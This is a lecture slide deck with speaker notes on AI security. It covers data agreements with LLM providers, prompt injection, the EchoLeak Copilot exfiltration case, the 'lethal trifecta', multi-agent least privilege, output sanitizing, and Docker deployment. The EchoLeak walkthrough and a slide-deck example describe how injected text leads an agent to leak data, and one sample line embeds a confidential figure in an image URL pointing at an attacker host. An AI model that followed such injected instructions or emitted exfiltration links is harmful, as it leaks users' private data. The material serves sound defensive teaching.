Security Risks

  1. Sending data to an LLM → risks of training on your data and data breach
  2. Letting an agent read unverified sources → risk of prompt injection
  3. If the agent can also reach data → risk of data exfiltration

Welcome to this session on AI security. As you go through these slides, remember that you can pause and ask me a question at any time. This session covers the security risks that come with using large language models and AI agents, and this first slide lays out the map. First, simply sending your data to an LLM raises two worries: that the provider might train on your data, and that the data could be exposed in a breach. Second, once you let an agent read unverified sources like web pages or emails, you open the door to prompt injection, where hidden text hijacks the agent’s behavior. And third, if that same agent can also reach your private data, an injection can steal it, which we call data exfiltration. We’ll take these risks in turn.

LLM Contractual Security

Let’s start with the risks of sending data to a model provider. This first section covers the contractual answer, the legal agreements that make it safe for most business uses.

Guarantee from the Model Provider: a DPA (+ BAA)

For almost every business use, the answer is to sign a contract and send the data. A no-train + zero-retention Data Processing Agreement — plus a BAA for PHI — is available as part of the standard commercial API account.

Step What it adds Enough for
Opt out of training (a setting; API default) Provider won’t train — but a revocable terms-of-service posture, data still retained briefly Personal, non-sensitive work
+ Signed DPA (+ BAA for PHI) A contract: liability, breach notice, audit, subprocessor list. A BAA covers PHI Client data, regulated data, PHI
+ Enterprise agreement SLAs, support, indemnification, capacity, SSO Scale and operations — not stronger privacy

Example: Anthropic’s Data Processing Addendum

For almost every business use, the practical answer is to sign a contract and send the data. The table shows three escalating steps. The first is just opting out of training, which is a setting and the default on the API. The provider says it won’t train on your data, but that’s a revocable terms-of-service posture, and the data is still retained briefly, so it’s suitable only for personal, non-sensitive work. The second step is a signed Data Processing Agreement, which turns the promise into a contract with liability, breach notification, audit rights, and a subprocessor list. Add a BAA if you handle protected health information. That’s the level for client data and regulated data. The third step, an enterprise agreement, adds SLAs, support, and indemnification, but note that it buys scale and operations, not stronger privacy.

LLM Physical Security

Contracts are promises. This next section is about physical security, meaning arrangements where sensitive data never reaches the provider at all.

Beyond the Contract

The DPA is a contractual guarantee — a promise, backed by liability, that satisfies your legal requirements. It is not a physical one: the data still travels to the provider, and you are trusting their terms and their security. For more sensitive data, add a physical layer.

  1. Send less, or send code — keep the data (or its identifying fields) on your side
  2. Anonymize — transform the data before it leaves
  3. Run a local model — the data never leaves your environment

These escalate in protection (and in cost and effort) — add as much as the data’s sensitivity warrants. Which one fits depends on the task: pure computation → send code; the model must read the content → anonymize or go local.

Here’s the key distinction. The DPA is a contractual guarantee, a promise backed by liability that satisfies your legal requirements. But it isn’t a physical guarantee: your data still travels to the provider, and you’re trusting their terms and their security. For more sensitive data, you can add a physical layer, and the slide lists three options. First, send less data, or send code instead of data, keeping the data or its identifying fields on your side. Second, anonymize, transforming the data before it leaves. Third, run a local model, so the data never leaves your environment at all. These escalate in protection but also in cost and effort. Which one fits depends on the task: pure computation points to sending code, while a task where the model must read the content points to anonymizing or going local.

Option 1 — Send Less, or Send Code

Two distinct techniques for keeping identifying data out of the request. They’re alternatives — pick one by what the task needs.

Send less: minimize

  • Drop the fields the task doesn’t need, then send the rest
  • Use when the model must see the (de-identified) rows
  • Partial protection: real — if de-identified — rows still leave

Send nothing: send code

  • Send only the schema and a few synthetic rows; the model writes a script you run in-house
  • Use when the task is pure computation (aggregate, join, score)
  • Structural guarantee: the model never sees a real row

Either works — they’re not a sequence. Minimizing is lighter and only partial; sending code is stronger but fits only code-shaped tasks (and you must review and sandbox the script, and scrub real rows out of the debugging loop). Sending code is what the agents’ run_python tool does.

Option one is really two distinct techniques, and they’re alternatives, not a sequence. The first is minimizing: drop the fields the task doesn’t need and send the rest. Use this when the model genuinely has to see the de-identified rows; it’s only partial protection, because real rows still leave. The second is sending code instead of data. You send only the schema and a few synthetic rows, the model writes a script, and you run that script in-house on the real data. This fits tasks that are pure computation, like aggregating, joining, or scoring, and it gives a structural guarantee: the model never sees a real row. It’s stronger, but you must review and sandbox the script and keep real rows out of the debugging loop. This is exactly what the run Python tool in our agents does.

Option 2 — Anonymize, Then Send

When the model must read the content but the PII is incidental — separable from the signal you need — transform it with Python before sending.

Tabular

  • Drop or tokenize the identifying columns — names, SSNs, account numbers, dates of birth, addresses
  • Tokens (CUSTOMER_001) let you rejoin the data later

Structured PDF

  • Fields sit in fixed positions: name in box a, SSN in box b
  • Extract and redact those boxes — no need to search the whole document
  • W2s bank statements, forms, …

Structured PII in free text

  • SSNs, account numbers, phones, emails inside a narrative PDF (contract, medical note)
  • Known patterns — regex finds them reliably, on your machine

Unstructured PII in free text

  • Names, dates — no fixed pattern, wherever the author put them
  • Drop or tokenize customer and employee names; read PDF for other names; use a small local model to complement

Option two applies when the model must read the content but the personal information in it is incidental, separable from the signal you need. You transform the data with Python before sending, and the four cards sort the problem by how the PII appears. For tabular data, drop or tokenize the identifying columns; tokens like customer zero zero one let you rejoin the data later. In structured PDFs like W-2s and bank statements, the fields sit in fixed positions, so you extract and redact those boxes. Structured PII inside free text, like social security numbers, phones, and emails, follows known patterns, so a regex on your own machine finds it reliably. The hard case is unstructured PII in free text, names and dates with no fixed pattern; there you drop or tokenize known names, with a small local model to complement.

Option 3 — Run a Local Model

  • Some data simply cannot go to any outside party — classified or top-secret defense data

  • Some firms choose to treat some data the same way

  • Running models locally (on-premise = on-prem) is the only alternative

  • Open-source models (Kimi, Qwen, Mistral, DeepSeek) on your servers — nothing leaves your building

  • You manage the hardware, GPUs, updates, and security

Option three is the strongest and the most demanding: run the model locally. Some data simply cannot go to any outside party, classified or top-secret defense data being the clearest example, and some firms choose to treat certain business data the same way. In that case, running models on premise is the only alternative. You take open-source models like Kimi, Qwen, Mistral, or DeepSeek and run them on your own servers, so nothing ever leaves your building. The trade-off is that you now own the whole operation: the hardware, the GPUs, the updates, and the security are all yours to manage.

Prompt Injections

Now we turn to the second big theme of this session: prompt injections, which are the central security problem for AI agents.

What Are Prompt Injections?

Prompt Injection

  • Hidden instructions embedded in data — emails, documents, web pages — that hijack the LLM’s behavior
  • The LLM reads the hidden text and follows the attacker’s instructions instead of (or in addition to) the user’s
  • The LLM cannot distinguish instructions from content — it’s all just text

Why It Matters

  • Any agent that reads untrusted content and has access to private data or tools is vulnerable
  • The attacker doesn’t need credentials — they just need to get text in front of the LLM
  • OWASP ranks prompt injection as the #1 risk for LLM applications (2025)

A prompt injection is a set of hidden instructions embedded in data, in an email, a document, or a web page, that hijacks the LLM’s behavior. When the model reads the content, it also reads the hidden text and may follow the attacker’s instructions instead of, or in addition to, yours. The fundamental problem is that the LLM cannot distinguish instructions from content; to the model, it’s all just text. Why does this matter so much? Any agent that reads untrusted content and also has access to private data or tools is vulnerable. And notice that the attacker doesn’t need credentials or a hacked account; they just need to get text in front of the LLM. OWASP ranks prompt injection as the number one risk for LLM applications.

What Can Prompt Injection Do?

Destructive Actions

  • Delete or modify files — the agent has the permissions you gave it
  • Send unauthorized messages — email, Slack, API calls on your behalf
  • Corrupt data — overwrite records, alter calculations, insert false information
  • Execute unintended code — if the agent can run code, so can the injected instructions

Standard Mitigations

  • Least-privilege permissions — give the agent read-only access unless it truly needs to write
  • Backups and version control — roll back if something goes wrong
  • Human approval for consequential actions — the agent proposes, a human confirms
  • Audit logging — record every action so you can detect and investigate

These safeguards protect against destructive actions but not against data theft. If the agent can read confidential data, a prompt injection can exfiltrate it — no file deletion, no visible damage, no audit trail that catches it in time. That is the harder problem.

What can an injection actually do? The left card lists destructive actions. A hijacked agent has whatever permissions you gave it, so it can delete or modify files, send unauthorized messages on your behalf, corrupt data, and execute code if it has a code tool. The right card lists the standard mitigations: least-privilege permissions, so the agent is read-only unless it truly needs to write; backups and version control so you can roll back; human approval for consequential actions; and audit logging so you can detect and investigate. But the box at the bottom is the pivot for everything that follows. These safeguards protect against destructive actions, not against data theft. If the agent can read confidential data, an injection can exfiltrate it quietly, with no visible damage and no audit trail that catches it in time. That’s the harder problem.

EchoLeak: Zero-Click Data Theft from Microsoft 365 Copilot

CVE-2025-32711 — June 2025

  1. Attacker sends an email to the victim containing hidden instructions (invisible to the human reader)
  2. Victim asks Copilot to summarize emails. Copilot reads the hidden instructions.
  3. Following the injected instructions, Copilot embeds confidential data into a URL in its response
  4. The victim’s browser automatically sends the URL (as an HTTP request) to the attacker’s server
  5. The attacker extracts the data from the URL — zero clicks, zero user awareness

Root cause: Copilot reads untrusted content (emails) and has access to private data and can render URLs. It combines all three capabilities in one LLM. The defense: separate these roles.

Here’s a real example: EchoLeak, a vulnerability in Microsoft 365 Copilot disclosed in June 2025. Walk through the five steps. The attacker sends the victim an ordinary-looking email containing hidden instructions the human reader can’t see. Later, the victim asks Copilot to summarize their emails, and Copilot reads the hidden instructions along with everything else. Following them, Copilot embeds confidential data into a URL in its response. The victim’s browser then automatically sends that URL as an HTTP request to the attacker’s server, and the attacker extracts the data from the URL. Zero clicks, zero user awareness. The root cause is that Copilot combined three capabilities in one LLM: it reads untrusted emails, it has access to private data, and it can render URLs. The defense is to separate those roles.

Least Privilege: Limit What an Injection Can Do

You can’t reliably detect an injection — the model can’t tell instructions from content. So don’t try to block the text; limit what a hijacked agent is able to do. An injection can only use the tools you gave the agent.

Real damage needs three things in the same agent. Take away any one and the attack has nothing to steal, no instructions to act on, or no way out.

1. Private data

Secrets worth stealing — client records, financials, your inbox

2. Untrusted content

Attacker-controllable text — web pages, emails, uploaded files

3. An outbound channel

A way to send data out — web fetch, send email, write to a shared place

This combination is the “lethal trifecta.” Least privilege means making sure no single agent holds all three.

Since the model can’t tell instructions from content, you can’t reliably detect an injection, so don’t try to block the text. Instead, limit what a hijacked agent is able to do, because an injection can only use the tools you gave the agent. The key insight is that real damage requires three things together in the same agent. First, private data: secrets worth stealing, like client records, financials, or your inbox. Second, untrusted content: text an attacker can control, like web pages, emails, or uploaded files. Third, an outbound channel: some way to send data out, like fetching from the web, sending email, or writing to a shared place. This combination is called the lethal trifecta. Take away any one leg and the attack has nothing to steal, no instructions to act on, or no way out.

Implement Least Privilege with Multiple Agents

One agent that reads the web, holds your data, and can send email has all three legs. Split the job so no single agent does.

The reader

  • Sees the untrusted content
  • Stripped of whichever leg would make it dangerous
  • Returns only text — a summary, extracted facts — to the next stage

The actor

  • Holds the private data and the outbound tools
  • Never reads raw untrusted content — only the reader’s cleaned text
  • Does the consequential work

Two agents is the simplest split; with several sources you may use several readers, each declawed for what it touches. The protection is structural: the agent exposed to the injection is too weak to do harm, and the powerful agent never sees the raw attack.

How do you implement least privilege in practice? Split the job across agents so no single one holds all three legs. The reader agent is the one that sees the untrusted content, and it’s deliberately stripped of whichever leg would make it dangerous; it returns only text, a summary or extracted facts, to the next stage. The actor agent holds the private data and the outbound tools and does the consequential work, but it never reads raw untrusted content, only the reader’s cleaned text. The protection is structural rather than clever: the agent that gets exposed to the injection is too weak to do any harm, and the powerful agent never sees the raw attack. Two agents is the simplest split; with several sources you might use several readers, each declawed for what it touches.

Different Sources, Different Restrictions

Which leg you remove depends on the source — on what the task needs from it.

Source What the task needs Legs it forces Leg you remove
Web search / browsing fetch external pages (the fetch is the outbound channel) untrusted + outbound no private data
Inbox / uploaded files read sensitive content you must act on untrusted + private data no outbound
Your own database query trusted records, no untrusted input private data + possibly outbound no untrusted leg

Which leg you remove depends on the source, because the task itself forces certain legs on you. Take web search or browsing: the task requires fetching external pages, and the fetch itself is an outbound channel, so you’re stuck with untrusted content plus outbound. The leg you can remove is private data, so the browsing agent shouldn’t hold any. An inbox or uploaded files are different: the content is untrusted and it’s sensitive material you must act on, so the agent holds private data too; there, the leg to remove is the outbound channel. And your own database is trusted, so that agent has private data and possibly an outbound channel but no untrusted leg at all. The pattern is always the same: figure out which legs the task forces, then strip the one it doesn’t.

Watch the Output Path

Least privilege on the agent isn’t the whole story — the output it produces is another channel out.

The Trojan Horse

  • An agent builds a slide deck combining web research with your confidential numbers
  • A prompt injection from the research slips in: ![](https://attacker.com/leak?data=BID_2.3B)
  • The agent can’t fetch the image — it has no internet. Nothing happens yet.
  • But when you open the deck on your internet-connected laptop, PowerPoint fetches the “image” — sending your number to the attacker’s server
  • This is exactly the EchoLeak mechanism applied to a different output format

Defense: sanitize the output, and enumerate any links for a human to review.

Least privilege on the agent isn’t the whole story, because the output the agent produces is itself a channel out. Here’s the Trojan horse scenario. An agent builds a slide deck combining web research with your confidential numbers. A prompt injection hidden in the research slips an image reference into the deck, pointing at an attacker’s server with your confidential figure encoded in the address. The agent itself can’t fetch that image; it has no internet access, so nothing happens yet. But when you open the deck on your internet-connected laptop, PowerPoint automatically fetches the so-called image, sending your number to the attacker’s server. This is exactly the EchoLeak mechanism applied to a different output format. The defense: sanitize the output, and enumerate any links for a human to review.

What Can Be Sanitized?

The sanitizer is ordinary code at the exit of an agent — not an LLM. It does only what it can decide for certain.

Mechanical — yes

  • Find every URL, link, embed, recipient, amount — regex, no understanding needed
  • Neutralize what auto-loads: an embedded image that fetches on open becomes an inert, click-required link — this kills the zero-click leak
  • Constrain to whitelists: a recipient must be a known contact, not an address pulled from the email
  • Tag tainted values so downstream code can flag them

So what can a sanitizer actually do? First, understand what it is: ordinary code sitting at the exit of an agent, not another LLM, and it does only what it can decide for certain. Mechanical checks are firmly in scope. It can find every URL, link, embed, recipient, and amount using regular expressions; no understanding is needed. It can neutralize anything that auto-loads, turning an embedded image that fetches on open into an inert link that requires a click, which kills the zero-click leak we just saw. It can constrain values to whitelists, insisting that a recipient be a known contact rather than an address pulled out of the email itself. And it can tag tainted values so that downstream code knows to flag them.

What Can Be Sanitized?

Semantic — no

  • Whether a found link belongs — the exfiltration pixel and the real source link are identical in form
  • Whether this send, this amount, this wording is what you intended
  • These depend on intent, and no regex can check intent


Sanitizing closes the mechanical channel completely. The semantic residue — did the model do the right thing with the content? — can’t be sanitized away; it needs a whitelist (when you can list the allowed values) or a human at the exit.

What the sanitizer cannot do is semantics. It can’t tell whether a link it found actually belongs in the document, because the exfiltration pixel and a legitimate source link are identical in form. It can’t tell whether this send, this amount, or this wording is what you intended. Those judgments depend on intent, and no regex can check intent. So here’s the summary: sanitizing closes the mechanical channel completely, but a semantic residue remains, the question of whether the model did the right thing with the content. That residue can’t be sanitized away. It needs either a whitelist, when you can list the allowed values in advance, or a human at the exit.

Why Human Review Isn’t Always Possible

Human approval is the backstop for the semantic residue — but a person can’t always sit at the exit.

When you can’t review

  • High volume: thousands of emails or documents an hour — no one can check each
  • Low latency: trading, real-time bidding, automated response — no time for a human
  • Unattended: scheduled or overnight agents, with no one watching
  • Can’t judge: the output is too big or technical for review to be real — rubber-stamping a 1,000-row file catches nothing

What replaces the human

  • Whitelist the arguments: recipient from contacts only, amount from an approved list — closes the semantic channel by construction
  • Bound the capability: reply only to the sender, draft only, read-only — so even a manipulated action is harmless
  • Otherwise: accept a bounded residual risk, or don’t fully automate

The way out of “no human” is to make the dangerous decision unnecessary — constrain the arguments or shrink the blast radius until there is nothing left to judge. When the action’s content must come from untrusted input and can’t be whitelisted, the residual risk is real.

Human approval is the backstop for that semantic residue, but a person can’t always sit at the exit. Containers

We now shift to containers, a tool that matters both for sharing your work and, as you’ll see, for AI security.

Why Containers?

Two reasons — and the second is part of AI security.

Sharing: build once, run everywhere

  • A container packages the script, Python, and every library into one image
  • The recipient needs only Docker — no installing the right Python, no chasing dependency errors
  • The same image runs on a laptop, a corporate server, or a public host

Isolation: a sandbox for the agent

  • The agent’s tools — run_python, file writes, shell — execute inside the container, not on your machine
  • It sees only the files and network you grant it; the host stays out of reach
  • If an injection turns the agent hostile, the blast radius is the container

The same packaging that makes an agent easy to share also makes it safer to run. Isolation is a concrete way to bound the capability — shrink what a compromised agent can touch.

There are two reasons to care about containers, and the second is part of AI security. The first is sharing: a container packages your script, Python itself, and every library into one image. The recipient needs only Docker, no installing the right Python, no chasing dependency errors, and the same image runs on a laptop, a corporate server, or a public host. The second reason is isolation. The agent’s tools, running Python, writing files, using a shell, execute inside the container rather than on your machine. The agent sees only the files and network you grant it, and the host stays out of reach. So if a prompt injection turns the agent hostile, the blast radius is the container. This is a concrete way to bound capability, in the sense we discussed earlier: shrink what a compromised agent can touch.

Containerizing an App or Agent

To put an app or agent in a Docker container, you need the following:

Ingredients (in one folder)

  • A base image with Python already installed
  • A requirements.txt listing your Python packages
  • Your Python files
  • A Dockerfile

The Dockerfile

A plain text file named Dockerfile (no extension) that Docker reads as a recipe. It specifies which base image to use, what to install, which files to copy in, and how to start the app.

Build the container with a simple terminal command docker build … executed in the folder

What does it take to containerize an app or agent? Everything goes in one folder, and there are four ingredients. You start from a base image that already has Python installed, add a requirements file listing your Python packages, include your own Python files, and add a Dockerfile. The Dockerfile deserves a word: it’s a plain text file, named Dockerfile with no extension, that Docker reads as a recipe. It specifies which base image to use, what to install, which files to copy in, and how to start the app. With those four things in place, building the container is a single terminal command, docker build, executed in that folder.

Sharing a Docker Image

  • Go to hub.docker.com and sign up for a free account
  • Choose a username — it becomes part of every image name you publish
  • Run docker login and enter your credentials once
  • Run docker push …

Then anyone with Docker Desktop installed can download the image with

docker pull …

and run it with

docker run …

Then use the app or agent at 127.0.0.1:8000 in a browser.

Depending on what the container does, you may need to pass authentication credentials to run it. For the containers we will look at, you need ANTHROPIC_APY_KEY in .env in the folder in which you run the container.

Once you’ve built an image, sharing it is straightforward. Go to Docker Hub, at the link on the slide, and sign up for a free account. Choose your username carefully, because it becomes part of every image name you publish. Then run the docker login command once with your credentials, and publish with the docker push command. From that point, anyone with Docker Desktop can download your image with a pull command, run it with a run command, and use the app or agent in a browser at the local address shown. One note from the bottom of the slide: depending on what the container does, the user may need credentials. For the containers we’ll look at, that means an Anthropic API key in a dot env file in the folder where the run command is executed.

Example

A tiny FastAPI app: it asks for your name and replies Hello, {name}!. Pull and run it — user does not need Python, no install except Docker.

Pull and run

docker pull kerryback/hello
docker run --rm -p 8000:8000 kerryback/hello

Then open 127.0.0.1:8000 in a browser, type your name, and click “Greet me”.

How it was built

The hello folder holds three files: main.py, requirements.txt, and a Dockerfile. The image was built by running one command inside that folder:

docker build -t kerryback/hello .

The . tells Docker to build from the current folder. No API key is needed — this app calls no model.

  1. Create a free account
  2. New service → Docker → paste your Docker Hub image name
  3. Add environment variables (API keys, database credentials)
  4. Deploy → public URL in minutes

After you create your account, Claude Code can do everything else.

Running on your laptop is fine for development, but you can also deploy a container to a public URL using a platform-as-a-service host like Koyeb, Railway, or Render. The process is short. Create a free account, start a new service, choose Docker, and paste in your Docker Hub image name. Add any environment variables the app needs, such as API keys or database credentials, and deploy; you get a public URL in minutes. GitHub Pages

GitHub Pages turns any repository into a website — free, no server, no configuration.

  1. Name your landing page index.html
  2. Push your repo to GitHub
  3. Go to Settings → Pages → set source to the main branch
  4. Your site is live at yourusername.github.io/repo-name/

Claude can do all these steps for you. This is only for static websites — no backend server. Pages can contain links and can run Pyodide apps. It is simple to acquire a custom domain name (~$15 per year) and use it in place of the github.io URL.

App and Agent Deployment

  • Koyeb, Railway, Render can do GitHub repo -> Docker container -> deploy

  • You can skip all of the Docker steps!

Here’s the payoff of combining the last two sections. The platform hosts we mentioned, Koyeb, Railway, and Render, can go directly from a GitHub repository to a Docker container to a deployed service. That means you can skip all of the Docker steps yourself. Push your code to GitHub, point the platform at the repo, and it handles the containerization and the deployment for you. So for many projects, GitHub plus one of these hosts is the entire path from code on your laptop to a running public app.
